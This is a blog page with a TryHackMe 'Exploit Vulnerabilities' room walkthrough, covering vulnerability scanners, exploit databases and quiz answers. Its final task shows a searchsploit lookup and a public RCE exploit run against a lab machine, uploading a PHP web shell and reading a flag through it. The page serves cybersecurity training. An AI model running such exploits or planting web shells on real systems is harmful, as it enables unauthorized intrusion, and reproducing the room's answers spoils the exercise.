<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>Try Hack Me Exploit Vulnerabilities | Classroom</title><link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon><meta name=author content="Animesh Roy @anir0y  "><meta name=description content="TryHackMe Room Exploit Vulnerabilities solved by Animesh Roy. this is a walkthough. read more..."><title>Animesh Roy | Classroom Posts</title><meta name=title content="Animesh Roy | Blogs & Writeups"><meta name=description content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways."><script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-SPD6BXK0P5")</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","it10lq8bk1")</script><meta property="og:type" content="website"><meta property="og:url" content="https://classroom.anir0y.in/"><meta property="og:title" content="Animesh Roy | Blogs & Writeups"><meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training"><meta property="og:image" content="https://i.imgur.com/Ji5C41H.png"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-exploitingavulnerabilityv2.md/"><meta property="twitter:title" content="Animesh Roy | Blogs & Writeups"><meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training"><meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png"><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-exploitingavulnerabilityv2.md/><meta property="og:title" content="Try Hack Me Exploit Vulnerabilities"><meta property="og:description" content="TryHackMe Room Exploit Vulnerabilities solved by Animesh Roy. this is a walkthough. read more..."><meta property="og:type" content="article"><meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-exploitingavulnerabilityv2.md/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-09-26T08:29:10+05:30"><meta property="article:modified_time" content="2021-09-26T08:29:10+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="Try Hack Me Exploit Vulnerabilities"><meta name=twitter:description content="TryHackMe Room Exploit Vulnerabilities solved by Animesh Roy. this is a walkthough. read more..."><link rel=stylesheet href=/css/semantic.min.css><link rel=stylesheet href=/css/icomoon.css><link rel=stylesheet href=/css/OverlayScrollbars.min.css><link rel=stylesheet href=/css/github-markdown.css><link rel=stylesheet href=/css/site.css><link rel=stylesheet href=/css/custom.css><style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style><link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css><link rel=stylesheet href=/css/custom.css></head><body class=default><nav class="ui secondary menu dream-menu"><div class=item><i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i></div><div class=item><i class="large link home icon" title=Home onclick='window.location.href="https://classroom.anir0y.in"'></i></div><div class=item><i class="large link icon theme-switch" onclick=themeSwitch()></i></div><div class=item><i class="large link search icon" onclick=toggleSearch()></i></div></nav><div class=flip-container><div class=flipper><section class=front><div class=dream-max-width><div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse><aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside"><div class="ui segment toc"><nav id=TableOfContents><ul><li><a href=#overview>OverView</a></li><li><a href=#task-01-introduction>Task 01: Introduction</a></li><li><a href=#task-02-automated-vs-manual-vulnerability-research>Task 02: Automated Vs. Manual Vulnerability Research</a><ul><li><a href=#flag-02>Flag-02</a></li></ul></li><li><a href=#task-03-finding-manual-exploits>Task 03: Finding Manual Exploits</a><ul><li><a href=#rapid7>Rapid7</a></li><li><a href=#github>GitHub</a></li><li><a href=#searchsploit>Searchsploit</a></li><li><a href=#flag-03>Flag-03</a></li></ul></li><li><a href=#task-04--example-of-manual-exploitation>Task 04: Example of Manual Exploitation</a><ul><li><a href=#flag--04>flag -04</a></li></ul></li><li><a href=#task-05-practical-manual-exploitation>Task 05: Practical: Manual Exploitation</a><ul><li><a href=#51>5.1</a></li><li><a href=#52>5.2</a></li><li><a href=#flag-05>Flag-05</a></li></ul></li></ul></nav></div><div class="ui segment actions"><button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
<i class="save icon"></i></button>
<a href="https://twitter.com/intent/tweet?text=Try%20Hack%20Me%20Exploit%20Vulnerabilities&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-exploitingavulnerabilityv2.md%2f" class="ui circular twitter icon button"><i class="twitter icon"></i></a>
<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-exploitingavulnerabilityv2.md%2f" class="ui circular facebook icon button"><i class="facebook icon"></i></a></div></aside><div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img><section class="ui top attached segment"><header><h1 class="ui large header">Try Hack Me Exploit Vulnerabilities<div class="sub header">@
<a href=https://bit.ly/34sGFiK target=_blank>Animesh Roy</a>
|
Sunday, Sep 26, 2021
| 7 minutes read
| Update at
Sunday, Sep 26, 2021</div></h1></header><article class=main><h2 id=overview>OverView</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><script src=https://tryhackme.com/badge/434937></script></td><td><a class=twitter-follow-button href=https://twitter.com/anir0y data-size=large>Follow @anir0y<a></td></tr><tr><td>Exploit Vulnerabilities</td><td><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/5fda25317f800a25f8cbc7320bbd83b2.png alt=logo></td></tr><tr><td><b>Exploit Vulnerabilities [Subscription Required]</b></td><td><a href=https://tryhackme.com/room/exploitingavulnerabilityv2>Exploit Vulnerabilities</a></td></tr></tbody></table><h2 id=task-01-introduction>Task 01: Introduction</h2><p>In this room, we are going to be going over some means of identifying vulnerabilities and coupling our research skills to learn how these can be abused.</p><hr><h2 id=task-02-automated-vs-manual-vulnerability-research>Task 02: Automated Vs. Manual Vulnerability Research</h2><p>There is a myriad of tools and services available in cybersecurity for vulnerability scanning. Ranging from being commercial (and footing a heavy bill) to open-source and free, vulnerability scanners are convenient means of quickly canvassing an application for flaws.</p><p>For example, the vulnerability scanner Nessus has both a free (community) edition and commercial. The commercial version costing thousands of pounds for a year&rsquo;s license will likely be used in organisations providing penetration testing services or audits</p><p>I have detailed some of the advantages and disadvantages of using a vulnerability scanner in the table below:</p><p><img src=https://i.imgur.com/dzdzOvP.png alt=img></p><p>Frameworks such as Metasploit often have vulnerability scanners for some modules; this is something you will come onto learn about in a further module in this pathway.</p><p>Manual scanning for vulnerabilities is often the weapon of choice by a penetration tester when testing individual applications or programs. In fact, manual scanning will involve searching for the same vulnerabilities and uses similar techniques as automated scanning.</p><p>Ultimately, both techniques involve testing an application or program for vulnerabilities. These vulnerabilities include:</p><p><img src=https://i.imgur.com/XYnVIgz.png alt=img></p><p>If you are keen to learn more about these vulnerabilities, the <a href=https://owasp.org/Top10/>OWASP framework</a> will be a useful read to you.</p><hr><h3 id=flag-02>Flag-02</h3><table><thead><tr><th>question</th><th>ans</th></tr></thead><tbody><tr><td>You are working close to a deadline for your penetration test and need to scan a web application quickly. Would you use an automated scanner? (Yay/Nay)</td><td><code>yay</code></td></tr><tr><td>You are testing a web application and find that you are able to input and retrieve data in a database. What vulnerability is this?</td><td><code>injection</code></td></tr><tr><td>You manage to impersonate another user. What vulnerability is this?</td><td><code>Broken Access Contrl</code></td></tr></tbody></table><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=task-03-finding-manual-exploits>Task 03: Finding Manual Exploits</h2><h3 id=rapid7>Rapid7</h3><p>Much like other services such as Exploit DB and NVE, Rapid7 is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability (I.e. application and operating system).</p><p>Additionally, the database contains instructions for exploiting applications using the popular Metasploit tool (you will learn about this tool in-depth later in the learning path). For example, this entry on <a href=https://www.rapid7.com/db/>Rapid7</a> is for <a href=https://www.rapid7.com/db/modules/exploit/multi/http/wp_plugin_sp_project_document_rce/>“Wordpress Plugin SP Project & Document</a>”, where we can see instructions on how to use an exploit module to abuse this vulnerability.</p><h3 id=github>GitHub</h3><p>GitHub is a popular web service designed for software developers. The site is used to host and share the source code of applications to allow a collaborative effort. However, security researchers have taken to this platform because of the aforementioned reasons as well. Security researchers store & share PoC’s (Proof of Concept) on GitHub, turning it into an exploit database in this context.</p><p>GitHub is extremely useful in finding rare or fresh exploits because anyone can create an account and upload – there is no formal verification process like there is with alternative exploit databases. With that said, there is also a downside in that PoC’s may not work where little to no support will be provided</p><p>GitHub uses a tagging and keyword system, meaning that we can search GitHub by keywords such as “PoC”, “vulnerability”, and many more. At the time of writing, there are 9,682 repositories with the keyword “cve”. We are also able to filter the results by programming language.</p><h3 id=searchsploit>Searchsploit</h3><p>Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. It is also available on the TryHackMe AttackBox. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system.</p><p>You are able to search searchsploit by application name and/or vulnerability type. For example, in the snippet below, we are searching searchsploit for exploits relating to Wordpress that we can use – no downloading necessary!</p><h3 id=flag-03>Flag-03</h3><table><thead><tr><th>question</th><th>ans</th></tr></thead><tbody><tr><td>What website would you use as a security researcher if you wanted to upload a Proof of Concept?</td><td><code>GitHub</code></td></tr><tr><td>You are performing a penetration test at a site with no internet connection. What tool could you use to find exploits to use?</td><td><code>searchsploit</code></td></tr></tbody></table><hr><h2 id=task-04--example-of-manual-exploitation>Task 04: Example of Manual Exploitation</h2><p>We can use the information gathered from task 2 in this room to exploit the vulnerable service. Ultimately, one of the most effective vulnerabilities that we can exploit is the ability to execute commands on the target that is running the vulnerable application or service.</p><p>For example, being able to execute commands on the target that is running the vulnerable application or service will allow us to read files or execute commands that we previously wouldn’t be able to perform using the application or service alone. Additionally, we can abuse this to gain what is known as a foothold to the machine. A foothold is an access to the vulnerable machine’s console, where we can then begin to exploit other applications or machines on the network.</p><p>We are going to use an exploit to perform remote code execution on the application from task 2 to be able to remotely execute commands on the vulnerable machine.</p><p>Before we start, it is important to note that exploits rarely come out of the box and are ready to be used. They often require some configuration before they will work for our environment or target. The level of configuration will vary upon the exploit, so you will often find multiple exploits for the same vulnerability on an application. It is up to you to figure out which exploit is the most appropriate or useful to you.</p><p>For example, in the snippet below, we can see that a few options have been changed to reflect the IP address of the machine that we are attacking from.</p><p><img src=https://i.imgur.com/l0P2xSn.png alt=img></p><p><img src=https://i.imgur.com/m0ex5Yd.png alt=img></p><p>Once we have configured the exploit correctly, let’s further read this exploit to understand how to use it. In the snippet below, we can see that we need to provide two arguments when running the exploit:</p><p><img src=https://i.imgur.com/8VEeb9L.png alt=img></p><p>With this information in mind, we are now ready to use this exploit on the vulnerable machine. We are going to do the following:</p><ol><li>Use the exploit to upload a malicious file to the vulnerable application containing whatever command we wish to execute, where the web server will run this malicious file to execute the code.</li><li>The file will first contain a basic command that we will use to verify that the exploit has worked.</li><li>Then we are going to read the contents of a file located on the vulnerable machine.</li></ol><p><img src=https://i.imgur.com/xLOalY6.png alt=img></p><p><img src=https://i.imgur.com/scIT9Gj.png alt=img></p><h3 id=flag--04>flag -04</h3><table><thead><tr><th>question</th><th>ans</th></tr></thead><tbody><tr><td>What type of vulnerability was used in this attack?</td><td><code>RCE</code></td></tr></tbody></table><hr><h2 id=task-05-practical-manual-exploitation>Task 05: Practical: Manual Exploitation</h2><p>Deploy the machine attached to this task and wait a minimum of five minutes for it to be fully set up. After five minutes, visit the webserver running on the machine by navigating to <code>http://MACHINE_IP</code> in the browser of the device connected to the THM network (your own or the AttackBox).</p><h3 id=51>5.1</h3><ul><li><p>Open IP in web-browser look into footer area:</p><p><img src=https://i.imgur.com/aTEvf6Y.png alt=img></p></li></ul><h3 id=52>5.2</h3><ul><li><p>look for vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>searchsploit online book store
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Exploit Title                                                                               |  Path
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>GotoCode Online Bookstore - Multiple Vulnerabilities                                         | asp/webapps/17921.txt
</span></span><span style=display:flex><span>Online Book Store 1.0 - <span style=color:#e6db74>&#39;bookisbn&#39;</span> SQL Injection                                             | php/webapps/47922.txt
</span></span><span style=display:flex><span>Online Book Store 1.0 - Arbitrary File Upload                                                | php/webapps/47928.txt
</span></span><span style=display:flex><span>Online Book Store 1.0 - Unauthenticated Remote Code Execution                                | php/webapps/47887.py
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div></li><li><p>we have a <code>Unauthenticated Remote Code Execution</code> let&rsquo;s use this to exploit the application.</p></li><li><p>copy the exploit:
<code>searchsploit -m php/webapps/47887.py</code></p></li><li><p>run the exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python 47887.py http://10.10.18.54
</span></span><span style=display:flex><span>&gt; Attempting to upload PHP web shell...
</span></span><span style=display:flex><span>&gt; Verifying shell upload...
</span></span><span style=display:flex><span>&gt; Web shell uploaded to http://10.10.18.54/bootstrap/img/PQytuI1suX.php
</span></span><span style=display:flex><span>&gt; Example command usage: http://10.10.18.54/bootstrap/img/PQytuI1suX.php?cmd<span style=color:#f92672>=</span>whoami
</span></span><span style=display:flex><span>&gt; Do you wish to launch a shell here? <span style=color:#f92672>(</span>y/n<span style=color:#f92672>)</span>: y
</span></span><span style=display:flex><span>RCE $ cat flag.txt
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>here<span style=color:#f92672>}</span>
</span></span></code></pre></div></li></ul><h3 id=flag-05>Flag-05</h3><table><thead><tr><th>question</th><th>ans</th></tr></thead><tbody><tr><td>Find out the version of the application that is running. What are the name and version number of the application?</td><td><a href=#51>5.1</a></td></tr><tr><td>Now use the resources and skills from this module to find an exploit that will allow you to gain remote access to the vulnerable machine.</td><td><code>n\a</code></td></tr><tr><td>Use this exploit against the vulnerable machine. What is the value of the flag located in a web directory?</td><td><a href=#52>5.2</a></td></tr></tbody></table><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script></article></section></div></div><footer class="ui basic center aligned segment" style=background-color:transparent><p>© 2010 - 2023 Classroom</p></footer></div></section><section class=back><div class=dream-max-width><header class="ui basic very padded segment dream-header"><div class="ui small circular image"><img src=/img/avatar.jpeg></div><div class=content><h1 class="ui medium header">Reading Stuffs<div class="sub header"></div></h1><article class="ui horizontal list"><a class=item href=/categories><i class="th list icon" title="All Categories"></i></a>
<a class=item href=/tags><i class="tags icon" title="All Tags"></i></a></article></div></header><div class="ui relaxed grid dream-grid dream-back"><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment"><h3 class="ui header">Social Links</h3><nav class="ui secondary menu dream-menu dream-socials"><div class=item><a href=/index.xml><i class="large rss square icon" title=RSS></i></a></div><div class=item><a href=mailto:classroom@anir0y.in><i class="large mail icon" title=Email></i></a></div><div class=item><a href=https://twitter.com/anir0y target=_blank><i class="large twitter icon" title=Twitter></i></a></div><div class=item><a href=https://facebook.com/0xanir0y target=_blank><i class="large facebook icon" title=Facebook></i></a></div><div class=item><a href=https://instagram.com/0xanir0y target=_blank><i class="large instagram icon" title=Instagram></i></a></div><div class=item><a href=https://www.linkedin.com/in/anir0y target=_blank><i class="large linkedin icon" title=Linkedin></i></a></div><div class=item><a href=https://github.com/anir0y target=_blank><i class="large github icon" title=GitHub></i></a></div></nav></article></div><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column"><article class="ui segment">YOU CAN REUSE MY CONTENT</article></div></div></div></section></div></div><script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(e,t,n){var o,i=e.getElementsByTagName(t)[0],s=window.twttr||{};return e.getElementById(n)?s:(o=e.createElement(t),o.id=n,o.src="https://platform.twitter.com/widgets.js",i.parentNode.insertBefore(o,i),s._e=[],s.ready=function(e){s._e.push(e)},s)}(document,"script","twitter-wjs"))</script><script src=/js/jquery.min.js></script>
<script src=/js/semantic.min.js></script>
<script src=/js/jquery.overlayScrollbars.min.js></script>
<script src=/js/header.js></script>
<script src=/js/main.js></script>
<script src=/js/theme.js></script>
<script src=/js/html2canvas.min.js></script>
<script src=/js/post.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script>
<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var e=localStore.getItem("hugo-theme-dream-is-dark"),e=e?e:window.defaultDark?"y":e,t="tomorrow",n="tomorrow-night",s=e==="y"?n:t;$("link[data-highlight]").attr("href","https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/"+s+".min.css"),$("pre").css("background",e==="y"?"#333":"")}</script><div class="ui inverted segment" id=dream-search><div class="ui search"><div class="ui transparent input"><input class=prompt type=text placeholder=Search></div><div class=results></div></div></div><script>$(document).ready(function(){$.getJSON("https://classroom.anir0y.in/index.json",function(e){$(".ui.search").search({source:e,searchFields:["title"],showNoResults:!0})})})</script><script src=/js/search.js></script></body></html>